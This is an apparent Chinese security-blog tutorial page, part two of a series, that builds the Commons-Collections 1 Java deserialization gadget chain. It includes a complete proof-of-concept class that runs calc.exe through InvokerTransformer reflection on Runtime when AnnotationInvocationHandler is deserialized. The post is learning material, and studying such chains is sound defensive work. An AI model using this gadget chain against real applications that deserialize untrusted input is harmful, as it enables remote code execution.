@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Java篇Commons-Collections 1 (2) | Welcome to Arsene.Tang &#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+    <meta name="description" content="web安全">
+  
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Welcome to Arsene.Tang 's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/localshare/css/share.css">
+
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Welcome to Arsene.Tang &#39;s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">一个喜欢web安全但菜的离谱的萌新</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/."><i class="fa fa-home"></i> 首页</a>
+        
+          <a class="main-nav-link" href="/archives/"><i class="fa fa-archive"></i> 归档</a>
+        
+          <a class="main-nav-link" href="/about/"><i class="fa fa-user"></i> 关于</a>
+        
+          <a class="main-nav-link" href="/atom.xml"><i class="fa fa-rss"></i> 订阅</a>
+        
+      </nav>
+    </div>
+    <div id="search-form">
+      <div id="result-mask" class="hide"></div>
+      <label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label>
+      <div id="result-wrap" class="hide">
+        <div id="search-result"></div>
+      </div>
+      <div class="hide">
+        <template id="search-tpl">
+          <div class="item">
+            <a href="/{path}" title="{title}">
+              <div class="title">{title}</div>
+              <div class="time">{date}</div>
+              <div class="tags">{tags}</div>
+            </a>
+          </div>
+        </template>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Java篇之CommonsCollections 1 (2)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Java篇Commons-Collections 1 (2)
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2022-02-05T16:00:00.000Z" itemprop="datePublished">2022年02月06日</time>
+</span>
+      
+      
+        <span class="article-views">
+  <i class="fa fa-views"></i>
+  <i id="busuanzi_container_page_pv">
+      <i id="busuanzi_value_page_pv"></i>
+  </i>
+</span>
+
+      
+      
+<a href="/2022/02/06/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(2)/#comments" class="article-comment-link">
+  
+    
+    
+    
+    
+    
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="CommonsCollections-1-2"><a href="#CommonsCollections-1-2" class="headerlink" title="CommonsCollections  1  (2)"></a>CommonsCollections  1  (2)</h1><p>上一篇文章中，我们写出了一个本地测试的一个cc1的类，但是实际的利用中我们需要把它变成反序列化的流，而在这个变换的过程中就会出现一些问题，比如说有些类没有实现<code>Serializable</code>接口，不能被序列化等等，这篇文章我们就来把它变成可利用的POC</p>
+<span id="more"></span>
+
+<h2 id="如何触发"><a href="#如何触发" class="headerlink" title="如何触发"></a>如何触发</h2><p>我们回想一下上一篇文章中是如何触发漏洞的，我们手动向修饰过的map中添加新元素从而触发一系列的回调，但在实际的漏洞利用环境中我们肯定是不能手工执行的，我们需要让它在反序列化后能自动触发，也就是说需要找个某个类，在执行了这个类的<code>readObject</code>后能够触发回调</p>
+<p>而这个类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，我们可以看看这个类的<code>readObject</code>方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span><span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);&#125;</span><br><span class="line">    <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">&quot;Non-annotation type inannotation serial stream&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    <span class="comment">// If there are annotation members without values, that situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123; <span class="comment">// i.e. member still exists</span></span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) || value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(annotationType.members().get(name)));&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看起来代码挺复杂的，但实际上逻辑很简单，就是它会遍历我们反序列化后的map，也就是<code>TransformedMap.decorate</code>修饰的map里的所有元素，并依次对它设置值，而在<code>setValue</code>的时候就会触发<code>TransformedMap</code>里面注册的<code>ChainedTransformer</code>对象中的<code>transform</code>方法，从而触发回调</p>
+<p>所以说我们就需要创建一个<code>AnnotationInvocationHandler</code>对象，将前面构造好的<code>outermap</code>放进来</p>
+<p>这里要利用到我们前面讲过的反射知识，因为这个类是在JDK内部的类，所以说不能直接用<code>new</code>来实例化，得利用反射，首先利用反射获取到它的构造方法，然后利用构造方法获取对象就好了，而这个类得构造函数有两个参数，第一个参数是一个<code>Annotation</code>；第二个参数就是前面构造的map，所以说构造代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object obj = construct.newInstance(Retention.class, outerMap);</span><br><span class="line">InvocationHandler handler = (InvocationHandler) obj;</span><br></pre></td></tr></table></figure>
+
+<p>而这里为啥是<code>Rention.class</code>呢？是由于<code>AnnotationInvocationHandler</code>类中的<code>readObject</code>方法，这里因为要进入到<code>if</code>语句中，要让<code>memberType</code>不为空，所以说就需要满足两个条件，这里涉及到Java注释相关的技术，我也不太明白，这里就先直接用吧：</p>
+<p>首先是<code>AnnotationInvocationHandler</code>的构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</p>
+<p>第二个条件是被<code>TransformedMap.decorate</code>修饰的Map中必须有一个键名为X的元素</p>
+<p>所以说为了满足这两个条件，我们用到了<code>Retention</code>，因为它正好就是<code>Annotation</code>的子类，而且它里面有个方法叫做<code>value</code>，所以说为了满足第二个条件我们还需要往map中添加一个元素，它的键名为<code>value</code>，值随意，代码为：<code>innerMap.put(&quot;value&quot;, &quot;abc&quot;);</code></p>
+<h2 id="关于反射"><a href="#关于反射" class="headerlink" title="关于反射"></a>关于反射</h2><p>其实按照上面的思路，我们已经可以写出POC了，将我们上面生成的<code>obj</code>对象进行序列化和反序列化操作就好了，具体的方法我前面的文章中有写到，这里我就直接给出代码了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream oo = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">oo.writeObject(obj);</span><br><span class="line">System.out.println(<span class="string">&quot;对象序列化成功！&quot;</span>);</span><br><span class="line">oo.close();</span><br><span class="line">System.out.println(barr);</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">Object o = (Object) ois.readObject();</span><br><span class="line">System.out.println(<span class="string">&quot;对象反序列化成功！&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>但当我们运行这段POC的时候，是会报错的，原因其实我们文章最开头就讲了，那就是有些类并没有实现<code>java.io.Serializable</code>接口，而没有实现这个接口的类是不允许被序列化的；最开始时我们传给<code>ConstantTransformer</code>的是<code>Runtime.getRuntime() </code>类，<code>Runtime</code>类并没有实现那个接口所以不允许被反序列化，但我们可以不直接利用<code>Runtime</code>类，而是通过反射来获取<code>Runtime</code>对象的呀，就是先获取<code>getRuntime</code>方法，然后利用这个方法创建对象就好了，方法其实上一篇文章也讲到了，这里给出代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method m = Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Runtime r = (Runtime) m.invoke(<span class="keyword">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里我们利用的就是<code>Runtime.class</code>对象而不是<code>Runtime.getRuntime()</code>对象了，前者是一个<code>java.lang.Runtime</code>对象，后者是一个 <code>java.lang.Class</code>对象。<code>Class</code>类有实现<code>Serializable</code>接口，所以是可以被序列化的</p>
+<p>然后我们再将这段反射的代码写成<code>transformers</code>的形式，就是说先用<code>ConstantTransformer</code>返回<code>Runtime.class</code>对象，然后再利用<code>InvokerTransformer</code>执行一个一个的方法就好了，结合反射的代码很容易看懂：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> String[] &#123;<span class="string">&quot;calc.exe&quot;</span> &#125;),&#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h2><p>我们把上面所有以及上一篇文章综合起来，形成完整的POC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1_2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> String[] &#123;<span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">    Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object obj = construct.newInstance(Retention.class, outerMap);</span><br><span class="line">    InvocationHandler handler = (InvocationHandler) obj;</span><br><span class="line"></span><br><span class="line">    ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">    oos.writeObject(handler);</span><br><span class="line">    System.out.println(<span class="string">&quot;对象序列化成功！&quot;</span>);</span><br><span class="line">    oos.close();</span><br><span class="line"></span><br><span class="line">    System.out.println(barr);</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">    Object o = (Object)ois.readObject();</span><br><span class="line">    System.out.println(<span class="string">&quot;对象反序列化成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/02/07/teQpCGryMKNuWTb.png" alt="image.png"></p>
+<p>这里的注意事项就是得先往<code>innerMap</code>中添加一个键名为<code>value</code>的元素，键值随意，原因上面也提到了</p>
+<h2 id="为什么无法触发？"><a href="#为什么无法触发？" class="headerlink" title="为什么无法触发？"></a>为什么无法触发？</h2><p>从上图中可以看到，我们并没有报异常，并且输出了序列化后的数据流，但为啥没弹出计算器呢？因为在Java 8u71之后的版本里面，Java 官方修改了 sun.reflect.annotation.AnnotationInvocationHandler 中的readObject函数，具体可以看下面这篇文章：<a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p>
+<p>改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。 所以后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了</p>
+<p>这里的内容我都是抄的p神的，因为我也是学习为主，明白了它的思路就好了，也就懒得去改Java的版本号了</p>
+<p>而在<code>ysoserial</code>中，用的却是<code>LazyMap</code>而不是我们这里用的<code>TransformedMap</code>，事实上好像也确实<code>LazyMap</code>用的更多，下一篇文章我们就来看如何把它转换为<code>LazyMap</code></p>
+
+        
+            <div id="toc-article">
+                
+  <div class="widget-wrap" id="toc-wrap">
+    <h3 class="widget-title"><i class="fa fa-toc"></i> 文章目录</h3>
+    <div class="widget">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections-1-2"><span class="toc-text">CommonsCollections  1  (2)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91"><span class="toc-text">如何触发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84"><span class="toc-text">关于反射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4POC"><span class="toc-text">完整POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%97%A0%E6%B3%95%E8%A7%A6%E5%8F%91%EF%BC%9F"><span class="toc-text">为什么无法触发？</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+
+            </div>
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://arsenetang.github.io/2022/02/06/Java篇之CommonsCollections 1 (2)/">https://arsenetang.github.io/2022/02/06/Java篇之CommonsCollections 1 (2)/</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li></ul>
+
+          
+    <div class="social-share">
+      <span>分享到:</span>
+    </div>
+
+
+
+        </div>
+      
+      
+        
+<nav id="article-nav">
+  
+  
+    <a href="/2022/02/03/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(1)/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">older</strong>
+      <div class="article-nav-title">Java篇Commons-Collections 1 (1)</div>
+    </a>
+  
+</nav>
+
+      
+      
+        
+
+
+
+
+
+
+
+      
+    </footer>
+  </div>
+</article>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-posts"></i> 最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/02/06/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(2)/">Java篇Commons-Collections 1 (2)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/03/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(1)/">Java篇Commons-Collections 1 (1)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/19/Java%E7%AF%87%E4%B9%8BJava%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Java篇之Java序列化与反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/15/Java%E7%AF%87%E4%B9%8BJava%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">Java篇之Java动态代理</a>
+          </li>
+        
+          <li>
+            <a href="/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/">WP篇之解析GFCTF---文件查看器</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-tag"></i> 标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/Java/" style="font-size: 13.33px;">Java</a> <a href="/tags/RCE/" style="font-size: 13.33px;">RCE</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Web安全</a> <a href="/tags/ctf/" style="font-size: 18.33px;">ctf</a> <a href="/tags/php/" style="font-size: 16.67px;">php</a> <a href="/tags/wp/" style="font-size: 11.67px;">wp</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15px;">反序列化</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
+    </div>
+  </div>
+
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022年02月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年11月</a><span class="archive-list-count">19</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-tag"></i> 标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWD/" rel="tag">AWD</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">17</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-link"></i> 友情链接</h3>
+    <div class="widget">
+      <ul>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://blog.csdn.net/ATFWUS">ATFWUS</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.darry-long.top/">darry</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn">eeee</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://fmyyy.gitee.io/">fmyyy</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://101.34.46.94/ple3.com/">g1ory</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://jev0n.com/">Jev0n</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://l61q4cheng.github.io/">L61q4_Cheng</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://le1a.com/">le1a</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://l0v3ming.github.io/">l0v3ming</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://mochu.blog.csdn.net">mochu7</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46330722">NoViC4</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://blog.o3ev.cn/">o3Ev</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://www.pllrry.site">pl1rry</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://rasalghul-1.github.io/">Ra&#39;sAlGhul</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://rencvn.top/">RenCvn</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://yao-mou.gitee.io/friend/">Siebene@</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="https://zltt197.github.io/">zltt</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://blog.dadachd.top/">达达</a>
+        </li>
+      
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+        
+      </div>
+      <a id="totop" href="#top"></a>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <p>
+        <a href="/sitemap.xml">网站地图</a>
+        <span> | </span><a href="/atom.xml">订阅本站</a>
+        <span> | </span><a href="/about/">联系博主</a>
+      </p>
+      
+        <p>
+          <i class="fa fa-visitors"></i>
+          <i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>
+          ，
+          <i class="fa fa-views"></i>
+          <i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>
+        </p>
+      
+      <p>
+        <span>Copyright &copy; 2022 Arsene.Tang.</span>
+        <span>Theme by <a href="https://github.com/chaooo/hexo-theme-BlueLake/" target="_blank">BlueLake.</a></span>
+        
+            <span>Count by <a href="http://busuanzi.ibruce.info/" target="_blank">busuanzi.</a></span>
+        
+        <span>Powered by <a href="https://hexo.io/" target="_blank">Hexo.</a></span>
+      </p>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+<script src="/js/search.json.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+  
+<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+  
+<script src="/localshare/js/social-share.js"></script>
+
+  
+<script src="/localshare/js/qrcode.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
